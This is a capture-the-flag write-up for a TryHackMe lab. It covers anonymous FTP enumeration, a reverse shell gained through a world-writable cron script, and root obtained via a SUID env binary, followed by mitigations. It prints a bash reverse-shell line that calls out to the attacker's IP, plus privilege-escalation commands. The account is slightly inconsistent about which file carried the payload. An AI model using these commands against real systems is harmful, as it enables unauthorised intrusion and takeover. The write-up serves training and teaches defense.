# TryHackMe - Anonymous Writeup

**Challenge:** https://tryhackme.com/room/anonymous  
**Target IP:** 10.201.29.134

---

## Overview

The **Anonymous** room on TryHackMe is a Linux privilege escalation challenge that tests reconnaissance, enumeration, exploitation, and privilege escalation skills. The attack chain involves discovering anonymous FTP access, manipulating scheduled scripts, gaining shell access, and escalating privileges through SUID binary abuse.

---

## I. Active Reconnaissance

### 1. Port Enumeration

Started with aggressive Nmap scan to identify open services:

```bash
nmap -A 10.201.29.134
```

**Key Findings:**
- **4 Open Ports Identified:** FTP (21), SSH (22), NetBIOS SMB (139, 445)
- **FTP Server:** vsftpd 3.0.3 - allows **anonymous login**
- **SSH:** OpenSSH 7.6p1 (Ubuntu)
- **SMB:** Samba 4.7.6 (Ubuntu)
- **OS:** Linux 4.15 (98% confidence)

| Port | Service | Version | Notable Features |
|------|---------|---------|------------------|
| 21 | FTP | vsftpd 3.0.3 | Anonymous login enabled |
| 22 | SSH | OpenSSH 7.6p1 | Standard SSH service |
| 139 | NetBIOS | Samba 3.X - 4.X | SMB file sharing |
| 445 | SMB | Samba 4.7.6 | Modern SMB dialect |

**Analysis Notes:**
- Aggressive scan chosen over stealth scan (appropriate for CTF environment)
- Anonymous FTP immediately flags potential data leakage
- SMB shares accessible with guest credentials

---

### 2. FTP Enumeration

Logged into FTP server using anonymous credentials:

```bash
ftp> open 10.201.29.134 21
Connected to 10.201.29.134.
220 NamelessOne's FTP Server!
Name: ftp
Password: [blank]
230 Login successful.
```

**Directory Structure:**
```
/
├── scripts/ (writable - rwxrwxrwx)
    ├── clean.sh (executable)
    ├── removed_files.log (readable, writable)
    └── to_do.txt (readable)
```

**Critical Discovery:** The `scripts` directory is **world-writable (777 permissions)**, suggesting active script execution with privilege.

---

### 3. SMB Enumeration

Listed available shares using smbclient:

```bash
smbclient -L 10.201.29.134
```

**Available Shares:**
| Share | Type | Access | Path |
|-------|------|--------|------|
| print$ | Disk | Restricted | Printer Drivers |
| pics | Disk | Anonymous Read | /home/namelessone/pics |
| IPC$ | IPC | Read/Write | /tmp |

Accessed the `pics` share and extracted 2 image files for analysis.

**Analysis:** SMB shares contained only images; subsequent analysis with stegseek, steghide, and strings yielded no actionable data—determined to be a red herring.

---

## II. Initial Exploitation

### 1. FTP Script Manipulation

Analyzed the `clean.sh` script content and `removed_files.log`:

**Observations:**
- `clean.sh` is executable by the system
- `removed_files.log` shows recent modifications (timestamp: Oct 17 13:26)
- Pattern indicates `clean.sh` is executed periodically (likely via cron job)

**Exploitation Strategy:**
1. Modified the world-writable `removed_files.log` file to include reverse shell payload
2. Created a reverse shell payload:
   ```bash
   bash -i >& /dev/tcp/10.17.19.104/4444 0>&1
   ```
3. Uploaded modified script to FTP server
4. Set up Netcat listener:
   ```bash
   nc -lvnp 4444
   ```

**Result:** Received reverse shell connection as `namelessone` user.

### 2. Reverse Shell Access

```bash
Connection received from 10.201.29.134:45678
bash-4.4$ whoami
namelessone
bash-4.4$ pwd
/home/namelessone
```

**Initial Shell Characteristics:**
- User: namelessone
- Shell: bash
- Home Directory: /home/namelessone
- Group: namelessone (uid 1000)

---

## III. Capture the Flag & Privilege Escalation

### 1. User Flag Capture

Located and captured user flag:

```bash
bash-4.4$ cat /home/namelessone/user.txt
flag{***hidden***}
```

### 2. Privilege Escalation Analysis

Enumerated SUID binaries accessible to current user:

```bash
find / -user root -perm -u=s 2>/dev/null
```

**Output:**
- /usr/bin/env (SUID binary - **exploitable**)
- /usr/bin/sudo
- /usr/bin/chsh
- /usr/bin/chfn
- /usr/bin/passwd
- /usr/bin/newuidmap
- /usr/bin/newgidmap
- /bin/su
- /bin/umount
- /bin/mount

### 3. Exploiting /usr/bin/env SUID Binary

The `/usr/bin/env` binary has the SUID bit set, allowing it to execute commands with elevated privileges.

**Exploitation using [GTFOBins](https://gtfobins.github.io/gtfobins/env/#sudo):**

```bash
bash-4.4$ /usr/bin/env /bin/sh -p
# whoami
root
# id
uid=0(root) gid=1000(namelessone) groups=1000(namelessone)
```

The `-p` flag preserves privileges in the shell, allowing command execution as root despite SUID execution context.

### 4. Root Flag Capture

```bash
# cat /root/root.txt
flag{***hidden***}
# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
[SSH key content]
-----END RSA PRIVATE KEY-----
```

---

## IV. Attack Chain Summary

| Phase | Technique | MITRE ATT&CK ID | Description |
|-------|-----------|-----------------|-------------|
| Reconnaissance | Active Scanning | T1595.001 | Port scanning with Nmap |
| Reconnaissance | Gather Victim Host Information | T1592.002, T1592.004 | Service version enumeration |
| Initial Access | Exploit Public-Facing Application | T1190 | FTP anonymous access abuse |
| Execution | Cron Job Scheduling | T1053.003 | Malicious script execution via cron |
| Persistence | Cron Job Creation | T1053.003 | Persistent backdoor via cron |
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548.001 | SUID binary exploitation (/usr/bin/env) |
| Defense Evasion | Abuse Elevation Control Mechanism | T1548.001 | Privilege preservation using -p flag |
| Command & Control | Ingress Tool Transfer | T1105 | Reverse shell communication |

---

## V. Key Vulnerabilities

### 1. Anonymous FTP Access
- **Risk:** Information disclosure, potential for malware distribution
- **Root Cause:** FTP anonymous login not disabled in vsftpd configuration
- **Mitigation:** Disable anonymous FTP access; require strong authentication

### 2. World-Writable Script Directory
- **Risk:** Arbitrary code execution with cron job privileges
- **Root Cause:** Improper file permissions (777) on scheduled script directory
- **Mitigation:** Restrict directory permissions to owner only (700 or 750)

### 3. Predictable Cron Job Execution
- **Risk:** Remote code execution when scripts are executed periodically
- **Root Cause:** World-writable scripts combined with automated execution
- **Mitigation:** Implement file integrity monitoring; restrict write access

### 4. SUID Binary Exploitation
- **Risk:** Privilege escalation to root
- **Root Cause:** /usr/bin/env flagged with SUID bit unnecessarily
- **Mitigation:** Remove SUID bit from `/usr/bin/env`; use sudo with specific commands instead

---

## VI. Defense & Mitigation Recommendations

### Immediate Actions
1. **Disable anonymous FTP:**
   ```bash
   # /etc/vsftpd.conf
   anonymous_enable=NO
   ```

2. **Fix file permissions:**
   ```bash
   chmod 750 /path/to/scripts/
   chmod 700 /path/to/scripts/*
   ```

3. **Remove SUID from /usr/bin/env:**
   ```bash
   sudo chmod u-s /usr/bin/env
   ```

### Long-term Security Hardening
- Implement file integrity monitoring (Tripwire, AIDE)
- Use security scanning tools (Lynis, OpenVAS)
- Apply principle of least privilege to all service accounts
- Regular security patching and OS hardening
- Network segmentation to restrict FTP access

---

## VII. Tools & Techniques Used

| Tool | Purpose | Command |
|------|---------|---------|
| Nmap | Port scanning & service enumeration | `nmap -A 10.201.29.134` |
| FTP Client | Anonymous access exploitation | `ftp 10.201.29.134` |
| Netcat | Reverse shell listener | `nc -lvnp 4444` |
| find | SUID binary discovery | `find / -user root -perm -u=s` |
| env | Privilege escalation | `/usr/bin/env /bin/sh -p` |

---

## VIII. Lessons Learned

1. **Default Configurations are Dangerous:** Anonymous FTP and SUID binaries create multiple attack vectors
2. **File Permissions Matter:** World-writable scripts combined with automated execution is critical
3. **Defense in Depth:** Multiple vulnerabilities must be chained to achieve root access
4. **Enumeration is Key:** Thorough reconnaissance identified the FTP vector over decoy SMB shares
5. **Tool Knowledge:** Understanding GTFOBins and SUID exploitation accelerated privilege escalation

---

## References

- MITRE ATT&CK Framework: https://attack.mitre.org/
- GTFOBins - /usr/bin/env: https://gtfobins.github.io/gtfobins/env/
- vsftpd Configuration Guide: https://security.appspot.com/vsftpd.html
- Linux Privilege Escalation Guide: https://payloadallthethings.com/
